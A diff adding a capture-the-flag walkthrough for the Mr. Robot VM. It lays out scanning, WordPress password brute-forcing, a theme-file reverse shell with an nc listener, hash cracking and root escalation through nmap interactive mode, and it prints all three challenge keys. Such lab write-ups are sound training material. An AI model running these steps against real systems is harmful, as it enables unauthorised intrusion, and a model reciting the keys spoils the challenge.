@@ -1,0 +1,204 @@
+---
+
+# Exploitation Walkthrough: Mr. Robot VM
+
+This report details the exploitation process for the **Mr. Robot CTF** virtual machine. The target machine simulates a vulnerable Ubuntu server running WordPress 4.3.1. Below is a step-by-step explanation of the enumeration, exploitation, and privilege escalation processes that led to the full compromise of the system.
+
+---
+
+## Table of Contents
+
+- [Target Information](#target-information)
+- [Step 1: Identifying the Target](#step-1-identifying-the-target)
+- [Step 2: Initial Scanning](#step-2-initial-scanning)
+- [Step 3: WordPress Enumeration](#step-3-wordpress-enumeration)
+- [Step 4: Exploiting WordPress](#step-4-exploiting-wordpress)
+- [Step 5: Privilege Escalation](#step-5-privilege-escalation)
+- [Step 6: Final Steps to Root](#step-6-final-steps-to-root)
+- [Conclusion](#conclusion)
+
+---
+
+## Target Information
+
+- **Operating System:** Ubuntu 14.04  
+- **Application:** WordPress 4.3.1  
+- **IP Address:** Dynamic (identified via enumeration)  
+- **Objective:** Capture all three keys to complete the challenge.  
+
+---
+
+## Step 1: Identifying the Target
+
+### Retrieving the MAC Address
+The MAC address was retrieved from the VM's Bridge Adapter settings in Advanced Mode:
+```
+08:00:27:D9:5E:C7
+```
+
+### Finding the Target's IP Address
+Using `arp -a`, we matched the MAC address to its corresponding IP address on the network. Additionally, we performed a subnet scan using Nmap:
+```bash
+nmap -sn 192.168.0.0/24
+```
+Result:
+```
+192.168.0.1
+192.168.0.112
+192.168.0.163
+192.168.0.231
+```
+The target was identified at `192.168.0.231`.  
+
+### Setting the IP as a Variable
+To simplify future commands:
+```bash
+export ip=192.168.0.231
+```
+
+---
+
+## Step 2: Initial Scanning
+
+### Nmap Scan
+Performed a detailed Nmap scan:
+```bash
+nmap -A -p- -v $ip
+```
+Results:
+- **Ports Open:** 80 (HTTP), 443 (HTTPS)
+- **Server:** Apache HTTPD
+- **OS:** Linux 3.x - 4.x  
+
+### Nikto Scan
+```bash
+nikto -h http://$ip
+```
+Findings:
+- `/wp-login/`: WordPress login page.
+- `/#wp-config.php#`: Configuration file (possible credentials).
+
+### Directory Brute Forcing
+```bash
+dirb http://$ip:80
+```
+Findings:
+- `/fsocity.dic`: A wordlist file.
+- `/key-1-of-3.txt`: A file containing the first key:  
+  `073403c8a58a1f80d943455fb30724b9`
+
+### Wordlist Processing
+We cleaned duplicates in `fsocity.dic`:
+```bash
+sort -u fsocity.dic -o fsocity_unique.dic
+wc -l fsocity_unique.dic
+```
+Result: **11,451 unique words**
+
+---
+
+## Step 3: WordPress Enumeration
+
+### Enumerating Users
+Using WPScan:
+```bash
+wpscan --url http://$ip --enumerate u
+```
+Findings:
+- **Username:** `admin`
+
+### Brute-Forcing the Password
+Using the processed wordlist:
+```bash
+wpscan --url http://$ip --usernames admin --passwords fsocity_unique.dic
+```
+Credentials found:
+- **Username:** Elliot  
+- **Password:** ER28-0652
+
+---
+
+## Step 4: Exploiting WordPress
+
+### Gaining a Reverse Shell
+- Edited the WordPress theme file (`archive.php`) to include a PHP reverse shell script.
+- Started a listener on the attacker machine:
+  ```bash
+  nc -lvnp 4444
+  ```
+- Successfully gained access to the target shell.
+
+### Stabilizing the Shell
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## Step 5: Privilege Escalation
+
+### Cracking the Robot User Hash
+Found in `/home/robot`:
+- `password.raw-md5`: `robot:c3fcd3d76192e4007dfb496cca67e13b`
+
+Cracked using `hashcat`:
+```bash
+echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hashes.txt
+hashcat -m 0 -a 0 robot.hashes.txt /usr/share/wordlists/rockyou.txt
+```
+Result:
+- **Password:** `abcdefghijklmnopqrstuvwxyz`
+
+### Switching to Robot User
+```bash
+su robot
+```
+Access granted. Retrieved the second key:  
+`822c73956184f694993bede3eb39f959`
+
+---
+
+## Step 6: Final Steps to Root
+
+### Exploring the Root Directory
+As the `robot` user, access to `/root` was denied.
+
+### Reverting to Elliot User
+Switched back to Elliot:
+```bash
+su Elliot
+```
+
+### Exploiting Nmap Interactive Mode
+Using the interactive mode in Nmap to traverse the file system:
+```bash
+nmap --interactive
+```
+From the interactive shell:
+```bash
+!sh
+cd /root
+ls
+```
+Discovered the final key: `key-3-of-3.txt`  
+Content:  
+`04787ddef27c3dee1ee161b21670b4e4`
+
+---
+
+## Conclusion
+
+With the discovery of the final key, the **Mr. Robot VM** was fully exploited. This exercise demonstrated the use of enumeration, brute-forcing, privilege escalation, and lateral movement techniques. The process highlighted the importance of securing WordPress installations and mitigating common misconfigurations.
+
+---
+
+**Keys Captured:**
+1. `073403c8a58a1f80d943455fb30724b9`
+2. `822c73956184f694993bede3eb39f959`
+3. `04787ddef27c3dee1ee161b21670b4e4`
+
+---
+
+This concludes the journey of owning the **Mr. Robot VM** and gaining valuable insights into system exploitation.
+
+--- 
